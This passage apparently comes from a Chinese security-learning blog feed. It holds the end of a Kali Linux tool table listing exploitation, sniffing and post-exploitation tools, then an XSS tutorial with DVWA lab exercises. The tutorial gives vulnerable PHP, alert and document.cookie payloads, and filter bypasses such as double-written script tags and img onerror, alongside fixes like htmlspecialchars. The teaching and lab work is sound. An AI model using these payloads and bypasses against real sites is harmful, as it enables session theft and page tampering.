c、c++、Objective-C</td><td></td></tr><tr><td>clang++</td><td>编译器</td><td>cmd-line</td><td>C++编译器，与clang的关系类似gcc和g++的类系</td><td></td></tr><tr><td>dex2jar</td><td>安卓逆向</td><td>cmd-line</td><td>apktool把apk还原成了资源文件和dex，dex2jar把dex还原成jar文件（.class）</td><td></td></tr><tr><td>edb-debug</td><td>动态调试</td><td>gui</td><td>软件逆向动态调试工具</td><td>Linux版Ollydbg</td></tr><tr><td>flashm</td><td>反汇编</td><td>cmd-line</td><td>.swf文件的反汇编工具可反汇编出.swf中的脚本代码</td><td></td></tr><tr><td>jad</td><td>反编译</td><td>cmd-line</td><td>dex2jar把文件还原成了.class，jad进一步把文件还原成.java文件</td><td></td></tr><tr><td>javasnoop</td><td>fuzz</td><td>gui</td><td>java程序漏洞评估工具</td><td></td></tr><tr><td>nasm shell</td><td>汇编</td><td>shell</td><td>nasm是32位汇编编译器，这是一个nasm的shell</td><td></td></tr><tr><td>ollydbg</td><td>动态调试</td><td>gui</td><td>windows平台大名鼎鼎的动态调试工具，Linux上是通过wine运行有点水土不服</td><td></td></tr><tr><td>radare2</td><td>静态分析</td><td>cmd-line</td><td>类似ida的静态反汇编分析工具，功能强大，开源</td><td>但是命令行操作这难度有点大</td></tr><tr><td>armitage</td><td>漏洞利用</td><td>gui</td><td>measploit的gui界面</td><td>嗯好像是比原来的msf-gui好点，不过叫人自己去启动msf还要登录，还是不用算了</td></tr><tr><td>beef</td><td>漏洞利用</td><td>cmd-line</td><td>利用msf的exp结合xss构造有攻击性的html页面，当浏览器访问即会受到攻击并获取shell</td><td>这可以啊，不过不懂对现在浏览器效果怎么样</td></tr><tr><td>metasploit</td><td>漏洞利用</td><td>shell</td><td>就是启动msfconsole咯</td><td></td></tr><tr><td>msf payload center</td><td>漏洞利用</td><td>cmd-line</td><td>生成包含exp的windows/android等各平台的可执行文件，木马制作利器</td><td>那这东西和msfvenom的区别是什么</td></tr><tr><td>searchsploit</td><td>漏洞利用</td><td>cmd-line</td><td>用于搜索已从exploitdb下载到本地的漏洞利用脚本</td><td>可以理解msf都是ruby写的可执行代码，exploit不一定用ruby写，也可能只是扫描述而非代码</td></tr><tr><td>Social-Engineering</td><td>漏洞利用</td><td>shell</td><td>一般用于生成各种插入了exp的文件，诱使目标打开而中招</td><td>社会工程学总说得很厉害，不过我总觉得社会工程学和DDOS就是最名不副实的</td></tr><tr><td>termineter</td><td>漏洞利用</td><td>shell</td><td>智能电表攻击框架</td><td>这需要硬件搭配吧，没玩过</td></tr><tr><td>bdfproxy</td><td>中间人攻击</td><td></td><td>处于中间人身份时可对经过的流量插入payload</td><td></td></tr><tr><td>driftnet</td><td>图版嗅探</td><td>cmd-line</td><td>用于嗅探流量中的图版并展示到x-window上</td><td>配上arp欺骗作为中间人才能发挥威力，自己拦自己的就好玩而已</td></tr><tr><td>ettercap</td><td>流量拦截</td><td>gui</td><td>听说可以截持同子网的流量，强无敌，原理是什么</td><td></td></tr><tr><td>hampster</td><td>代理</td><td>cmd-line</td><td>好像也是代理转发流量的</td><td></td></tr><tr><td>macchanger</td><td>mac欺骗</td><td>cmd-line</td><td>修改本机上网时的mac地址，一用作身份隐藏，二可用来绕过wifi mac黑名单</td><td>应该只是软修改mac地址不可能可写吧</td></tr><tr><td>mitmproxy</td><td>代理</td><td>cmd-line</td><td>好像也是代理转发流量的</td><td>感觉没什么特色啊</td></tr><tr><td>netsniff-ng</td><td>流量捕获</td><td>cmd-line</td><td>高性能的流量捕获套件，可能大流量时的捕获效果比较稳定</td><td></td></tr><tr><td>responder</td><td>主机嗅探</td><td>cmd-line</td><td>被动嗅探与所在主机交互的主机的操作系统版本等信息</td><td></td></tr><tr><td>wireshark</td><td>流量捕获</td><td>gui</td><td>拦截所有经过指定网卡的流量</td><td>sectools常年排行第一的工具，这就不用多说了吧</td></tr><tr><td>backdoor</td><td></td><td></td><td></td><td></td></tr><tr><td>exe2hex</td><td>编码转换</td><td>cmd</td><td>顾名思义就是把exe文件转成十六进制文件</td><td>不过这样的意义是什么，不是以十六进制就能打开了吗</td></tr><tr><td>Intersect</td><td>脚本生成</td><td>shell</td><td>感觉是SQL 有攻击性Intersect语句的生成工具</td><td></td></tr><tr><td>mimikatz</td><td>密码提取</td><td>cmd-line</td><td>用于从windows内存中提取密码</td><td></td></tr><tr><td>nishang</td><td>后渗透</td><td>cmd-line</td><td>基于powershell的后渗透攻击工具</td><td></td></tr><tr><td>PowerSploit</td><td>后渗透</td><td>cmd-line</td><td>也是一个基于powershell的后渗透攻击工具</td><td></td></tr><tr><td>proxychains</td><td>多重代理</td><td>cmd-line</td><td>好像用来配置多种代理的</td><td></td></tr><tr><td>weevely</td><td>webshell</td><td>shell</td><td>webshell连接工具不过好像要用自己生成的小马</td><td></td></tr><tr><td>autopsy</td><td>网页分析</td><td>web</td><td>启动一个服务通过浏览器访问使用，感觉是分析网页各种元素的不是很懂</td><td></td></tr><tr><td>binwalk</td><td>文件识别</td><td>cmd-line</td><td>用于分析一个文件中是否其实有多个文件</td><td>ctf的key文件提取就常用到的</td></tr><tr><td>bulk_extractor</td><td>要素提取</td><td>cmd-line</td><td>扫描给定的目录或文件，如果发现一些如电话号码网址等关键的信息则输出到文件</td><td></td></tr><tr><td>chkrootkit</td><td>系统检查</td><td>cmd-line</td><td>扫描本机，查看本机是否存在受rootkit影响的地方</td><td>理解成360的木马查杀也差不多</td></tr><tr><td>foremost</td><td>文件恢复</td><td>cmd-line</td><td>文件恢复工具，用于被删除的文件的恢复，就是360等的那个文件恢复功能</td><td></td></tr><tr><td>galleta</td><td>cookie文件</td><td>cmd-line</td><td>用于分析IE的cookie文件输出其中的有用信息</td><td></td></tr><tr><td>hashdeep</td><td>hash计算</td><td>cmd-line</td><td>用于计算文件hash值，支持多种散列算法</td><td></td></tr><tr><td>volafox</td><td>内存分析</td><td>cmd-line</td><td>针对Mac OS X的内存分析工具，可从其内存镜像中读取进程列表等各种主机信息</td><td>先用工具把当前内存抓取下来，然后再用来分析；内存数据容易被破坏所以这确实很有意义</td></tr><tr><td><a href="http://www.jianshu.com/p/5f13ee20f5b0">volatility</a></td><td>内存分析</td><td>cmd-line</td><td>volafox的扩展，支持Mac OS X/Linux/Windows</td><td></td></tr><tr><td>casefile</td><td>报告编写</td><td>gui</td><td>一个画图工具，packet tracer用来画网络拓扑，这用来画场景拓扑</td><td>这写出高大上的报告啊</td></tr><tr><td>cutycapt</td><td>网页截屏</td><td>cmd-line</td><td>一个基于WebKit内核的网页截图工具，就是指定一个url它就能用解析url并把url界面截下来</td><td>各种扫描器中的截图就是使用类似的工具完成的，并不会真用个浏览器访问再截图下来</td></tr><tr><td>dradis</td><td>报告生成</td><td>web</td><td>可解析burpsuite/nmap等生成的扫描文件，并可将扫描结果转存为pdf或html</td><td></td></tr><tr><td>faraday IDE</td><td>报告管理</td><td>gui</td><td></td><td></td></tr><tr><td>keepnote</td><td>笔记本</td><td>gui</td><td>较之记事本，可建文件夹，支持富文本，可导出为其他格式</td><td></td></tr><tr><td>magictree</td><td>报告管理</td><td>gui</td><td></td><td></td></tr><tr><td>pipal</td><td>词频统计</td><td>cmd-line</td><td>说词频统计并不是很准确，文命令可分析统计给定文件中的词语的“<a href="http://www.freebuf.com/sectool/49592.html">各种最</a>”</td><td></td></tr><tr><td>recordmydesktop</td><td>屏幕录制</td><td>cmd-line</td><td>屏幕录制，输出.ogv格式视频</td><td>不过感觉这视频格式占用磁盘有点大啊</td></tr><tr><td>maltegoce</td><td>关系分析</td><td>gui</td><td>通过网络搜索，获取某个IP或邮箱与其他IP或邮箱的拓扑关系</td><td>这东西有那么强，但社工的东西还是没那么强，而且还是外国的工具在天朝的网络</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 工具说明书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】五、XSS基础</title>
      <link href="2020/04/08/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E4%BA%94%E3%80%81XSS%E5%9F%BA%E7%A1%80/"/>
      <url>2020/04/08/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E4%BA%94%E3%80%81XSS%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>本文学习XSS基础以及DVWA模拟环境的几道例题。</p><a id="more"></a><h2 id="XSS介绍与原理"><a href="#XSS介绍与原理" class="headerlink" title="XSS介绍与原理"></a>XSS介绍与原理</h2><p>XSS攻击是在网页中<strong>嵌入客户端恶意脚本代码</strong>，一般是使用JavaScript语言编写。</p><p>JavaScript可以用来<strong>获取用户的Cookie</strong>、<strong>改变网页内容</strong>、<strong>URL跳转</strong>，因此攻击者需要做的是向Web页面注入JavaScript，就可以盗取用户Cookie、黑掉页面、导航到恶意网站。</p><p>通常在url中加入<script>JavaScript恶意代码</script>来实现一些特殊效果，也可以在JavaScirpt中利用url形式来加载外部脚本。</p><p>漏洞实现原理</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdkdkz55npj317y09st9c.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdkdkz55npj317y09st9c.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200406140611891"></p><p>XSS漏洞分类：反射型、存储型、DOM型</p><p>XSS漏洞修复</p><ol><li>HTML实体编码</li><li>使用白名单过滤用户输入的恶意字符</li><li>根据业务场景对症下药</li></ol><h3 id="存储型XSS实战"><a href="#存储型XSS实战" class="headerlink" title="存储型XSS实战"></a>存储型XSS实战</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>攻击者<strong>在页面上插入XSS代码</strong>，服务端将数据存入数据库，当用户访问到存在XSS漏洞的页面时，服务端从数据库中取出数据展示到页面上，导致XSS代码执行，达到攻击效果。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdkdkztfkaj31ik0iet9u.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdkdkztfkaj31ik0iet9u.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200406150941187"></p><p>允许用户存储数据的Web应用程序都可能会出现存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当攻击者再次访问某个界面时，这段XSS代码被程序读出来响应给浏览器，造成XSS攻击。</p><blockquote><p>比起其他两种类型的XSS攻击，存储型XSS不需要用户手动去触发。</p></blockquote><p>注意：判断输出数据是否在属性内</p><p>当输出数据在属性内，<input type="text" name="content" value="<script>alert(1)</script>"/></p><p>以上JavaScript代码虽然插入到HTML中，但因为XSS代码在Value属性中，最终当做值来处理，浏览器在解析HML时，会将数据以文本的形式输出在网页。</p><p>因此我们需要根据响应的标签构造HTML代码来闭合，插入XSS代码为<code>&quot;/ &gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，最终在HTMl文档中为<code>&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;&quot;/ &gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;/&gt;</code>，这样就可以闭合input标签，使得输出的内容不再Value属性内，从而造成XSS跨站漏洞。</p><h4 id="存储型XSS测试步骤"><a href="#存储型XSS测试步骤" class="headerlink" title="存储型XSS测试步骤"></a>存储型XSS测试步骤</h4><ol><li><p>添加正常留言’helloworld‘，审查元素得知该HTML代码为<code>&lt;li&gt;&lt;strong&gt;username&lt;/strong&gt;&lt;span class=&quot;message&quot;&gt;helloword&lt;/span&gt;</code></p></li><li><p>如果不清楚具体输出位置，有三种模糊测试方法</p><ul><li>普通注入 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li><li>闭合标签注入 <code>&quot; /&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li><li>闭合标签注入<code>&lt;/textarea&gt;&#39;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script</code></li></ul></li><li><p>当存储型XSS代码注入后，每次加载留言界面XSS代码都会被执行</p></li></ol><p><strong>总结：留言就是恶意XSS代码伪装的。</strong></p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>攻击者<strong>在URL中插入XSS代码</strong>，服务端将URL中的XSS代码输出到页面上，攻击者将带有XSS代码的URL发送给用户，用户打开后受到XSS攻击。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdlb0qt0pij319w0fgaez.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdlb0qt0pij319w0fgaez.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200407165505422"></p><h4 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h4><p>程序接受username值后再输出，如果<code>username=&lt;script&gt;恶意代码&lt;/script&gt;</code>，则会让恶意代码在服务器端执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]；</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者利用站内信方式将带有恶意代码的URL发送给正常用户以获取用户的Cookie即登录信息，则攻击者可以利用Cookie（以正常用户的身份）登录该网站。</p><p>方法：寻找需要传入参数（形如<code>?id=1</code>）的URL，在闭合标签再加入<code>&lt;script&gt;</code>代码。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><h4 id="DOM简介"><a href="#DOM简介" class="headerlink" title="DOM简介"></a>DOM简介</h4><p>DOM全称Document Object Model（文档对象模型），使用DOM可以允许程序和脚本动态地访问和更新文件的内容、结果和样式。</p><p>HTML DOM树<br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdljzwmcotj30wo0ggjv7.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdljzwmcotj30wo0ggjv7.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200308140930363"></p><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>攻击者在URL中插入XSS代码，前端页面直接从URL中获取XSS代码并输出到页面，导致XSS代码执行，攻击者将带有XSS代码的URL发送给用户，用户打开后受到XSS攻击。（与反射型XSS漏洞相比，DOM型XSS漏洞不需要经过后端处理，只在前端进行）</p><h4 id="经典DOM型XSS示例"><a href="#经典DOM型XSS示例" class="headerlink" title="经典DOM型XSS示例"></a>经典DOM型XSS示例</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取URL中的content值并输出</span></span><br><span class="line"><span class="keyword">var</span> temp = <span class="built_in">document</span>.URL;</span><br><span class="line"><span class="keyword">var</span> index = <span class="built_in">document</span>.URL.indexOf(<span class="string">&quot;content=&quot;</span>) + <span class="number">4</span>;</span><br><span class="line"><span class="keyword">var</span> par = temp.substring(index);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="built_in">decodeURI</span>(par));</span><br></pre></td></tr></table></figure><h4 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h4><p>输入<code>http://127.0.0.1/dom.html?content=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>就会产生XSS漏洞。</p><h2 id="常用XSS漏洞修复函数"><a href="#常用XSS漏洞修复函数" class="headerlink" title="常用XSS漏洞修复函数"></a>常用XSS漏洞修复函数</h2><blockquote><p>在下面实战中我们还会讲解一遍函数的具体作用</p></blockquote><ol><li>Strip_tags() 所有HTML、XML、PHP元素均被删除</li><li>htmlspecialchars 将部分字符转换为HTML实体，防止浏览器将其识别为HTML元素。<ul><li><code>&quot; </code>–&gt; <code>&amp;quot;</code></li><li><code>&amp;</code>–&gt;<code>&amp;amp;</code></li><li><code>&#39;</code>–&gt;<code>&#39;</code></li><li><code>&lt;</code>–&gt;<code>&amp;lt</code></li><li><code>&gt;</code>–&gt;<code>&amp;gt</code></li></ul></li><li>addslashes() 在字符串中出现预定字符之前添加反斜杠的字符串。</li><li>stripslahes(string) 删除字符串中的反斜杠</li></ol><h2 id="XSS辅助测试工具"><a href="#XSS辅助测试工具" class="headerlink" title="XSS辅助测试工具"></a>XSS辅助测试工具</h2><h4 id="Beef"><a href="#Beef" class="headerlink" title="Beef"></a><a href="https://github.com/beefproject/beef">Beef</a></h4><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdll65s7bij318q0b4aej.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdll65s7bij318q0b4aej.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200407224617512"></p><p>搭建：</p><ol><li>docker pull janes/beef</li><li>docker run –rm -p 3000:3000 janes/beef</li><li>访问<a href="http://127.0.0.1:3000/ui/panel">http://127.0.0.1:3000/ui/panel</a> 默认账号密码beef/beef</li></ol><p>使用：当用户执行XSS代码之后，获取信息进行详细分析。</p><h4 id="XSS’OR"><a href="#XSS’OR" class="headerlink" title="XSS’OR"></a><a href="http://xssor.io/">XSS’OR</a></h4><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdllidwdt4j30ck03a0sr.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdllidwdt4j30ck03a0sr.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200407225802626"></p><p>Encode/Decode 代码编码解码</p><p>Codz 测试CSS工具，生成一些POST数据</p><p>Probe 给你一个JS文件你可以插入到指定的网页中，以来获取信息。</p><h4 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a><a href="http://secbox.cn/">XSS平台</a></h4><p>网上JS漏洞集合平台</p><h4 id="IE-Tester"><a href="#IE-Tester" class="headerlink" title="IE Tester"></a><a href="">IE Tester</a></h4><p>模拟IE低版本</p><h2 id="DVWA-XSS实战"><a href="#DVWA-XSS实战" class="headerlink" title="DVWA XSS实战"></a>DVWA XSS实战</h2><blockquote><p>安装DVWA模拟环境</p><p>下载并安装docker </p><p>docker pull citizenstig/dvwa</p><p>docker run -dt -p 8997:80 citizenstig/dvwa</p><p>访问<a href="http://127.0.0.1:8997/">http://127.0.0.1:8997</a> 默认账号密码admin/password</p></blockquote><h3 id="XSS-Reflected-Low"><a href="#XSS-Reflected-Low" class="headerlink" title="XSS(Reflected) Low"></a>XSS(Reflected) Low</h3><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源代码可以看到代码直接引用name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>输入<code>&lt;script&gt;alert(/nzy/)&lt;/script&gt;</code>,弹框</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdm4vo7zhfj30ow078t8v.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdm4vo7zhfj30ow078t8v.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200408100811511"></p><p>url:<a href="http://127.0.0.1:8997/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(/nzy/)%3C/script%3E#">http://127.0.0.1:8997/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%2Fnzy%2F%29%3C%2Fscript%3E#</a></p><h3 id="XSS-Reflected-Medium"><a href="#XSS-Reflected-Medium" class="headerlink" title="XSS(Reflected) Medium"></a>XSS(Reflected) Medium</h3><h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ); </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源代码可以看出对输入进行了过滤，基于黑名单思想，利用str_replace()函数将输入中含有<code>&lt;script&gt;</code>替换成<code> </code>。但是这种防护机制仍可以轻松绕过。</p><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>利用双写绕过，输入<code>&lt;scr&lt;script&gt;ipt&gt;alert(/nzy/)&lt;/script&gt;</code>，在经过str_replace()函数处理后为<code>&lt;script&gt;alert(/nzy/)&lt;/script&gt;</code></li><li>大小写混淆绕过，黑名单思想只禁止<code>&lt;script&gt;</code>，因此可以利用大小写混淆绕过，输入<code>&lt;Script&gt;alert(/nzy/)&lt;/scirpt&gt;</code></li></ol><h3 id="XSS-Reflected-High"><a href="#XSS-Reflected-High" class="headerlink" title="XSS(Reflected) High"></a>XSS(Reflected) High</h3><h4 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ); </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源代码可以看出同样是使用了黑名单思想，但是preg_replace()函数用于正则表达式的搜索和替换，这样使得Medium级别的双写绕过、大小写混淆绕过方法都是小。</p><p>Preg_replace()函数中i表示忽略大小写</p><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>虽然无法再使用带有<code>&lt;script&gt;</code>字样的标签来注入XSS代码，但是可以利用img、body等标签事件或者iframe等标签src来注入恶意的JS代码。</p><p>输入<code>&lt;img src=1 onerror=alert(/nzy/)&gt;</code></p><h3 id="XSS-Reflected-Impossible"><a href="#XSS-Reflected-Impossible" class="headerlink" title="XSS(Reflected) Impossible"></a>XSS(Reflected) Impossible</h3><h4 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ); </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在High级别中，我们可以利用img、body等标签事件进行注入恶意JS代码，所以在impossible级别中，利用上文讲到过的htmlspecialchars()函数将部分字符（<code>&amp; &quot; &#39; &lt; &gt; </code>）转换为HTML实体，防止浏览器将其识别为HTML元素。</p><h3 